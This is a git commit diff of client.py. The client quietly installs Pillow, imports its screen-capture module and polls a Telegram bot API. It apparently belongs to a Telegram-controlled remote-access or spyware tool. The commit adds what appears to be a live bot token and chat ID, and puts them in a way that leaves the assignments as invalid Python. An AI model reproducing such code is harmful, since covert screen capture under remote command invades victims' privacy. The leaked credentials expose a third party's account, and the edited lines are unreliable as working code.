f8c518ec9406c6480b5cb51b7af09e80aa4e207d
Danger15535x <agastyatomar50@gmail.com>
2025-07-13 14:45:05 +0530

    Update client.py

--- client.py
+++ client.py
@@ -13,8 +13,8 @@ except ImportError:
         os.system("python3 -m pip install pillow -q -q -q")
         from PIL import ImageGrab
 
-TOKEN = ''   #change the token here
-CHAT_ID = ''   #change the chat id here
+TOKEN = ''   8041725477:AAHpoyOSd-gnPx8qKiBlAvf4ngMG5Q9E-AA
+CHAT_ID = ''   7583214569
 processed_message_ids = []
 def get_updates(offset=None):
     url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
